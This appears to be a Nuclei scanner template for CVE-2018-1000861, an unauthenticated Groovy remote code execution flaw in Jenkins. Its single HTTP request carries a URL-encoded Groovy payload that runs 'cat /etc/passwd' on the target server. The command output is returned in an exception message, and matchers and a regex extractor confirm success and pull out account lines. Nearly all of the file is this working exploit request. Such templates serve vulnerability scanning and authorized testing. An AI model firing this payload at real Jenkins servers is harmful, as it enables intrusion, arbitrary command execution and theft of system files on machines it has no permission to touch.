id: CVE-2018-1000861-jenkins-rce
info:
  name: Jenkins RCE via Groovy Script Plugin (CVE-2018-1000861)
  author: trainzment
  severity: high
  tags: jenkins,rce

http:
  - method: GET
    path:
      - "{{BaseURL}}/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&value=class%20abcd{abcd(){def%20proc=%22cat%20/etc/passwd%20%22.execute();def%20os=new%20StringBuffer();proc.waitForProcessOutput(os,%20System.err);throw%20new%20Exception(os.toString())}}"
    matchers:
      - type: word
        words:
          - "root:"
        part: body

    extractors:
      - type: regex
        part: body
        regex:
          - "root:(.*)nologin"
